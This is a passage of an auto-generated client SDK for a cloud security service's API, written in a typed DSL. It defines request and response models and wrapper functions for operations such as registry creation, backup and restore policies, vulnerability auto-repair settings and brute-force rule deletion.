    persistenceDay?: int32(name='PersistenceDay', example='30'),
    protocolType?: int32(name='ProtocolType', example='1'),
    regionId?: string(name='RegionId', example='cn-shanghai'),
    registryHostIp?: string(name='RegistryHostIp', example='1.13.XXX.XXX'),
    registryName?: string(name='RegistryName', example='fanyi'),
    registryType?: string(name='RegistryType', example='CI/CD'),
    token?: string(name='Token', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', example='30'),
    userName?: string(name='UserName', example='RegistryUser'),
    vpcId?: string(name='VpcId', example='vpc-2vchkxmf2j9yjt3x2****'),
    whiteList?: string(name='WhiteList', example='192.168.XXX.XXX'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='1AF1E723-53F1-55BF-A4B2-15CB7A32****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model CreateJenkinsImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateJenkinsImageRegistryResponseBody(name='body'),
}

async function createJenkinsImageRegistryWithOptions(request: CreateJenkinsImageRegistryRequest, runtime: Util.RuntimeOptions): CreateJenkinsImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.domainName)) {
    body['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    body['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    body['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    body['Password'] = request.password;
  }
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.protocolType)) {
    body['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.regionId)) {
    body['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    body['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  if (!Util.isUnset(request.registryType)) {
    body['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    body['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    body['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    body['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    body['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.whiteList)) {
    body['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'CreateJenkinsImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createJenkinsImageRegistry(request: CreateJenkinsImageRegistryRequest): CreateJenkinsImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return createJenkinsImageRegistryWithOptions(request, runtime);
}

model CreateOrUpdateAssetGroupRequest {
  groupId?: long(name='GroupId'),
  groupName?: string(name='GroupName'),
  uuids?: string(name='Uuids'),
}

model CreateOrUpdateAssetGroupResponseBody = {
  groupId?: long(name='GroupId'),
  requestId?: string(name='RequestId'),
}

model CreateOrUpdateAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOrUpdateAssetGroupResponseBody(name='body'),
}

async function createOrUpdateAssetGroupWithOptions(request: CreateOrUpdateAssetGroupRequest, runtime: Util.RuntimeOptions): CreateOrUpdateAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOrUpdateAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createOrUpdateAssetGroup(request: CreateOrUpdateAssetGroupRequest): CreateOrUpdateAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOrUpdateAssetGroupWithOptions(request, runtime);
}

model CreateRestoreJobRequest {
  includes?: string(name='Includes', description='The directory in which the files included in the restoration task are located. This parameter is specified when you create the anti-ransomware policy. The value is a directory that requires protection.', example='["root"]'),
  snapshotHash?: string(name='SnapshotHash', description='The hash value of the snapshot.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='d4b399edaad94b038e8f91873f19e3eae010ca30798fc36db3a164dd343f****'),
  snapshotId?: string(name='SnapshotId', description='The ID of the snapshot that you want to use for restoration.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='s-00023dhaatxp18mh****'),
  snapshotVersion?: string(name='SnapshotVersion', description='The version of the backup data.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='165570544****'),
  sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: backup snapshots for Elastic Compute Service (ECS) files
*   **File**: backup snapshots for on-premises servers', example='ECS_FILE'),
  target?: string(name='Target', description='The path to which you want to restore data.', example='/root/testfls'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data you want to restore.', example='inet-ecs-4e876cb0-09f7-43b8-82ef-4bc7a93769b5'),
  vaultId?: string(name='VaultId', description='The ID of the backup vault that is used in the restoration task.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='v-0002n12wokck2q0x****'),
}

model CreateRestoreJobResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BD4B24CE-E5C4-5727-B731-BE85F1D4****'),
}

model CreateRestoreJobResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateRestoreJobResponseBody(name='body'),
}

async function createRestoreJobWithOptions(request: CreateRestoreJobRequest, runtime: Util.RuntimeOptions): CreateRestoreJobResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.includes)) {
    query['Includes'] = request.includes;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.snapshotId)) {
    query['SnapshotId'] = request.snapshotId;
  }
  if (!Util.isUnset(request.snapshotVersion)) {
    query['SnapshotVersion'] = request.snapshotVersion;
  }
  if (!Util.isUnset(request.sourceType)) {
    query['SourceType'] = request.sourceType;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vaultId)) {
    query['VaultId'] = request.vaultId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateRestoreJob',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createRestoreJob(request: CreateRestoreJobRequest): CreateRestoreJobResponse {
  var runtime = new Util.RuntimeOptions{};
  return createRestoreJobWithOptions(request, runtime);
}

model CreateServiceLinkedRoleRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas'),
}

model CreateServiceLinkedRoleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B94243D2-9342-4D82-87B9-DF9A038A87E1'),
}

model CreateServiceLinkedRoleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateServiceLinkedRoleResponseBody(name='body'),
}

/**
  * For more information about service-linked roles, see [Service-linked roles](~~160674~~).
  *
  * @param request CreateServiceLinkedRoleRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateServiceLinkedRoleResponse
 */
async function createServiceLinkedRoleWithOptions(request: CreateServiceLinkedRoleRequest, runtime: Util.RuntimeOptions): CreateServiceLinkedRoleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateServiceLinkedRole',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * For more information about service-linked roles, see [Service-linked roles](~~160674~~).
  *
  * @param request CreateServiceLinkedRoleRequest
  * @return CreateServiceLinkedRoleResponse
 */
async function createServiceLinkedRole(request: CreateServiceLinkedRoleRequest): CreateServiceLinkedRoleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createServiceLinkedRoleWithOptions(request, runtime);
}

model CreateSimilarSecurityEventsQueryTaskRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId'),
  similarEventScenarioCode?: string(name='SimilarEventScenarioCode'),
  sourceIp?: string(name='SourceIp'),
}

model CreateSimilarSecurityEventsQueryTaskResponseBody = {
  createSimilarSecurityEventsQueryTaskResponse?: {
    status?: string(name='Status'),
    taskId?: long(name='TaskId'),
  }(name='CreateSimilarSecurityEventsQueryTaskResponse'),
  requestId?: string(name='RequestId'),
}

model CreateSimilarSecurityEventsQueryTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSimilarSecurityEventsQueryTaskResponseBody(name='body'),
}

async function createSimilarSecurityEventsQueryTaskWithOptions(request: CreateSimilarSecurityEventsQueryTaskRequest, runtime: Util.RuntimeOptions): CreateSimilarSecurityEventsQueryTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.similarEventScenarioCode)) {
    query['SimilarEventScenarioCode'] = request.similarEventScenarioCode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSimilarSecurityEventsQueryTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createSimilarSecurityEventsQueryTask(request: CreateSimilarSecurityEventsQueryTaskRequest): CreateSimilarSecurityEventsQueryTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSimilarSecurityEventsQueryTaskWithOptions(request, runtime);
}

model CreateSuspEventNoteRequest {
  eventId?: long(name='EventId', description='The ID of the alert event to which you want to add remarks. You can call the [DescribeSuspEvents](~~251497~~) operation to query the IDs of alert events.', example='668931'),
  note?: string(name='Note', description='The remarks that you want to add.', example='Ignore'),
}

model CreateSuspEventNoteResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model CreateSuspEventNoteResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSuspEventNoteResponseBody(name='body'),
}

async function createSuspEventNoteWithOptions(request: CreateSuspEventNoteRequest, runtime: Util.RuntimeOptions): CreateSuspEventNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSuspEventNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createSuspEventNote(request: CreateSuspEventNoteRequest): CreateSuspEventNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSuspEventNoteWithOptions(request, runtime);
}

model CreateUniBackupPolicyRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='admin'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', description='Specifies whether the database is manually added. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **ORACLE**
*   **MSSQL**', example='MYSQL'),
  fullPlan?: map[string]any(name='FullPlan', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed'),
  incPlan?: map[string]any(name='IncPlan', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed'),
  instanceId?: string(name='InstanceId', description='The ID of the Elastic Compute Service (ECS) instance.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the IDs of ECS instances.', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='mysql-policy'),
  retention?: int32(name='Retention', description='The retention period of backup data.', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='5242880'),
  uniRegionId?: string(name='UniRegionId', description='The region in which the server resides.', example='cn-hangzhou'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data is backed up based on the anti-ransomware policy.

>  You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='admin'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', description='Specifies whether the database is manually added. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **ORACLE**
*   **MSSQL**', example='MYSQL'),
  fullPlanShrink?: string(name='FullPlan', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed'),
  incPlanShrink?: string(name='IncPlan', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed'),
  instanceId?: string(name='InstanceId', description='The ID of the Elastic Compute Service (ECS) instance.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the IDs of ECS instances.', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='mysql-policy'),
  retention?: int32(name='Retention', description='The retention period of backup data.', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='5242880'),
  uniRegionId?: string(name='UniRegionId', description='The region in which the server resides.', example='cn-hangzhou'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data is backed up based on the anti-ransomware policy.

>  You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2FAEB7D0-C0B9-581C-877A-F80F50AA****'),
}

model CreateUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniBackupPolicyResponseBody(name='body'),
}

async function createUniBackupPolicyWithOptions(tmpReq: CreateUniBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.databaseAddByUser)) {
    query['DatabaseAddByUser'] = request.databaseAddByUser;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createUniBackupPolicy(request: CreateUniBackupPolicyRequest): CreateUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniBackupPolicyWithOptions(request, runtime);
}

model CreateUniRestorePlanRequest {
  database?: string(name='Database', description='The name of the database.', example='qtc'),
  instanceUuid?: string(name='InstanceUuid', description='The UUID of the Hybrid Backup Recovery (HBR) agent that is used to restore the data of the database on your server.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the UUID.', example='ac457b30598d11ed800000163e02****'),
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the ID.', example='123'),
  resetScn?: string(name='ResetScn', description='The identifier of the point in time for restoration in the backup version that you want to use. The database is an Oracle database.****

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the value.', example='925702.0'),
  resetTime?: string(name='ResetTime', description='The point in time for restoration in the backup version that you want to use. The database is an Oracle database.****

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the value.', example='2022-10-29 01:06:24'),
  restoreInfo?: string(name='RestoreInfo', description='The information about the database. This parameter is available when the database is a Microsoft SQL Server (MSSQL) database. The value is a JSON string. Valid values:

*   **name**: the name of the database
*   **files**: the path to the database files

>  You can call the [DescribeUniRecoverableList](~~DescribeUniRecoverableList~~) operation to query the information.', example='{"files": {"qtc":"F:\\\\database\\\\qtc.mdf","qtc_log":"F:\\\\database\\\\qtc_0.ldf"},
"name":"qtc"}'),
  timePoint?: long(name='TimePoint', description='The point in time to which you want to restore data.

>  You can call the [DescribeRestorePlans](~~DescribeRestorePlans~~) operation to query the point in time.', example='1656957664000'),
}

model CreateUniRestorePlanResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model CreateUniRestorePlanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniRestorePlanResponseBody(name='body'),
}

async function createUniRestorePlanWithOptions(request: CreateUniRestorePlanRequest, runtime: Util.RuntimeOptions): CreateUniRestorePlanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.resetScn)) {
    query['ResetScn'] = request.resetScn;
  }
  if (!Util.isUnset(request.resetTime)) {
    query['ResetTime'] = request.resetTime;
  }
  if (!Util.isUnset(request.restoreInfo)) {
    query['RestoreInfo'] = request.restoreInfo;
  }
  if (!Util.isUnset(request.timePoint)) {
    query['TimePoint'] = request.timePoint;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniRestorePlan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createUniRestorePlan(request: CreateUniRestorePlanRequest): CreateUniRestorePlanResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniRestorePlanWithOptions(request, runtime);
}

model CreateVulAutoRepairConfigRequest {
  reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='TestAutoRepair'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values: 
- **cve**: Linux software vulnerability 
- **sys**: Windows system vulnerability', example='cve'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25032:zlib 1.2.11 memory corruption'),
      name?: string(name='Name', description='The name of the vulnerability.', example='anolisos:8.4:ANSA-2022:0001'),
    }
  ](name='VulAutoRepairConfigList', description='The vulnerabilities that can be automatically fixed.'),
}

model CreateVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateVulAutoRepairConfigResponseBody(name='body'),
}

async function createVulAutoRepairConfigWithOptions(request: CreateVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): CreateVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vulAutoRepairConfigList)) {
    query['VulAutoRepairConfigList'] = request.vulAutoRepairConfigList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createVulAutoRepairConfig(request: CreateVulAutoRepairConfigRequest): CreateVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createVulAutoRepairConfigWithOptions(request, runtime);
}

model DeleteAntiBruteForceRuleRequest {
  ids?: [ long ](name='Ids', description='An array that consists of the IDs of the defense rules against brute-force attacks to delete.'),
}

model DeleteAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model DeleteAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteAntiBruteForceRuleResponseBody(name='body'),
}

async function deleteAntiBruteForceRuleWithOptions(request: DeleteAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): DeleteAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteAntiBruteForceRule(request: DeleteAntiBruteForceRuleRequest): DeleteAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteAntiBruteForceRuleWithOptions(request, runtime);
}

model DeleteBackupPolicyRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy that you want to delete.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='12'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy that you want to delete. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
}

model DeleteBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DeleteBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyResponseBody(name='body'),
}

async function deleteBackupPolicyWithOptions(request: DeleteBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteBackupPolicy(request: DeleteBackupPolicyRequest): DeleteBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyWithOptions(request, runtime);
}

model DeleteBackupPolicyMachineRequest {
  policyId?: long(name='PolicyId'),
  policyVersion?: string(name='PolicyVersion'),
  uuid?: string(name='Uuid'),
  uuidList?: [ string ](name='UuidList'),
}

model DeleteBackupPolicyMachineResponseBody = {
  requestId?: string(name='RequestId'),
}

model DeleteBackupPolicyMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyMachineResponseBody(name='body'),
}

async function deleteBackupPolicyMachineWithOptions(request: DeleteBackupPolicyMachineRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
